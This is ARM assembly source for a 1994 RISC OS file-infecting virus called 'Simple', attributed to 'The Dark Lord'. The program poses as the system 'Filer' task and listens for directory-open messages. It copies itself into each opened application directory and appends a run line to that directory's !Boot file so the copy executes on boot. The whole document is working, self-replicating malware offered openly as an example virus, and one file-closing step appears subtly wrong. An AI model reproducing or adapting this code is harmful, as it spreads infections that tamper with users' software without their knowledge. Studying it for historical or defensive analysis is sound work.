   ; Simple, a example virus
   ; Copyright (C) 1994 The Dark Lord

   .start
   B wimp_init         ;Jump over copyright message

   DCB 10,10,"Simple, (C) 1994 The Dark Lord",10,10
   ALIGN

   .wimp_init
   MOV R0,#200         ;Minimum WIMP is 2.00
   LDR R1,task         ;Load magic word
   ADR R2,taskname     ;Pointer to our task's name
   SWI XWimp_Initialise    ;Init the wimp
   SWIVS   XOS_Exit        ;Just incase of error
   STR R1,taskhandle       ;store the task handle

   .poll_loop
   MOV R0,#0           ;Poll mask
   ADR R1,pollblock        ;Poll block
   SWI XWimp_Poll      ;Poll the wimp...
   TEQ R0,#17          ;Is the poll message wanted?
   TEQNE   R0,#18          ;Is it the other message wanted?
   BNE poll_loop       ;It is not relevent, branch back to top
   TEQ R0,#17          ;User_Message
   TEQNE   R0,#18          ;User_MessageRecorded
   BEQ user_message
   B   poll_loop       ;Back to the top just incase

   .user_message
   LDR R0,[r1,#16]     ;Get message number from block
   TEQ R0,#5           ;Message_DataOpen (5)
   TEQNE   R0,#0           ;Message_Quit (0)
   BNE poll_loop       ;Not an interesting message, return to poll

   TEQ R0,#5           ;Message_DataOpen (5)
   BEQ infect          ;If so, try and infect
   TEQ R0,#0           ;Message_Quit
   BEQ closedown       ;If so, close down wimp and quit
   B   poll_loop       ;Just incase

   .closedown
   LDR R0,taskhandle       ;Load our task's handle
   LDR R1,task         ;Load the magic word
   SWI XWimp_CloseDown     ;Close down wimp task
   SWI XOS_Exit        ;And quit program

   .infect
   ADR R0,pollblock        ;Get the address of poll block
   ADD R0,R0,#44       ;Go to the path of file
   BL  count_len       ;Count the string's length, into R11
   ADD R1,R0,R11       ;Add to pointer to get to end of pathname
   STR R1,place        ;Save place for later reference

   MVN R3,#0           ;Virus filename counter
   ADR R4,filename     ;Address of string to copy
   .copy_filename1
   ADD R3,R3,#1        ;Add 1 to counter
   LDRB    R5,[R4,R3]      ;Load a byte from original string
   STRB    R5,[R1,R3]      ;And write it on the end of the path
   CMP R5,#0           ;Is it a null?
   BNE copy_filename1      ;No, copy next character

   ADR R0,pollblock        ;save_code expects filename in R10
   ADD R10,R0,#44      ;so reextract it from pollblock
   BL  save_code       ;Save the code in the file pointed to

   MVN R3,#0           ;Boot filename counter
   ADR R4,boot         ;Address of string to copy
   LDR R0,place        ;Get the place again
   .copy_filename2
   ADD R3,R3,#1        ;Add one to counter
   LDRB    R5,[R4,R3]      ;Get next byte of original string
   STRB    R5,[R0,R3]      ;And save the byte back
   CMP R5,#0           ;Is it the null at the end?
   BNE copy_filename2      ;No, copy next chacater

   ADR R0,pollblock        ;boot_line expects filename in R10
   ADD R10,R0,#44      ;so reextract it from pollblock
   BL  add_boot_line       ;save the boot line to !Boot file

   B   poll_loop       ;Branch back to poll loop.

   .count_len
   MVN R11,#0          ;counter/offset pointer
   .count_loop
   ADD R11,R11,#1      ;Add one to our counter/offset pointer
   LDRB    R10,[R0,R11]        ;Load a byte from R0+R11
   CMP R10,#0          ;Compare byte will null terminator
   BNE count_loop      ;Not a null, get next character and count

   MOV PC,R14          ;Return to calling code. R11=Length

   .save_code
   MOV R0,#10          ;Save memory as file
   MOV R1,R10          ;Move filename from R10 to R1
   MOV R2,#&FF0        ;Absolute executable file type
   ADD R2,R2,#8        ;&FF8 won't fit in the instrucion, so add 8
   ADR R4,start        ;Start of code
   ADR R5,end          ;End of code
   SWI XOS_File        ;Save the code
   MOV PC,R14          ;Return to calling code.

   .add_boot_line
   MOV R0,#&C0         ;Open file
   MOV R1,R10          ;Move filename from R10 to R1
   SWI XOS_Find        ;Open the file, handle in R0
   MOV R9,R0           ;Move handle somewhere safe

   MOV R0,#2           ;Read Extent
   MOV R1,R9           ;File handle
   SWI XOS_Args        ;Get the extend of the file into R2

   MOV R0,#1           ;Set pointer
   SWI XOS_Args        ;R2 is already set from above

   MVN R2,#0           ;Counter of bytes written
   MOV R1,R9           ;Get the file handle from R9
   ADR R3,load_line        ;Address of line to add
   .put_loop
   ADD R2,R2,#1        ;Add 1 to the counter
   LDRB    R0,[R3,R2]      ;Load the next byte
   SWI XOS_BPut        ;And write the byte to the file
   CMP R2,#18          ;Is it the last character yet?
   BNE put_loop        ;If not, loop again

   MOV R0,#0           ;Close File
   MOV R9,R1           ;Move file handle from R9 to R1
   SWI XOS_Find        ;Close the file

   MOV PC,R14          ;Otherwise, return to calling code.

   .task
   DCB "TASK"
   .taskname
   DCB "Filer",0
   .load_line
   DCB 10,60,"Obey$Dir",62,".Simple",10,0
   .filename
   DCB ".Simple",0
   .boot
   DCB ".!Boot",0
   ALIGN
   .taskhandle
   DCD -1
   .place
   DCD -1
   .end
   .pollblock
